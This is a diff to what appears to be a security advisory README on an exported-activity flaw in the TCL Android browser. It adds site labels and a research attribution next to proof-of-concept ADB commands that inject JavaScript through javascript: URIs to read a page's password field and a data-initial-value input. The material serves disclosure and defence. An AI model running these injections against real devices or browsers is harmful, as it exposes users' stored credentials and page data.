@@ -35,11 +35,12 @@ This vulnerability is particularly concerning because:
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/poc.gif)
 
-These ADB commands inject JavaScript to extract password data & can be accomplished without ADB with no permissions.
+These ADB commands inject JavaScript to extract password data** & can be accomplished without ADB with no permissions.
 
 ```bash
 adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bvar%20password%20%3D%20document.getElementById(%27pass%27).value%3Balert(%27Password%3A%20%27%20%2B%20password)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
 ```
+Facebook.com
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/Facebook.gif)
 
@@ -49,6 +50,8 @@ adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bva
 ```
 adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bvar%20initialValue%20%3D%20document.querySelector(%27input[data-initial-value]%27).getAttribute(%27data-initial-value%27)%3Balert(%27Initial%20Data%20Value%3A%20%27%20%2B%20initialValue)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
 ```
+
+Google.com
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/Gmail.gif)
 
@@ -94,4 +97,8 @@ Assisting in malicious persistence.
 1. **Restrict Activity Export:** Do not export activities unless necessary.
 If required, implement proper authorization checks to ensure that only legitimate entities can invoke it.
 
+**These POC's were adapted from research by Asmit Nayak, Rishabh Khandelwal, Kassem Fawaz & the University of Wisconsin – Madison**
+```
+ https://arxiv.org/pdf/2308.16321.pdf
+```
 
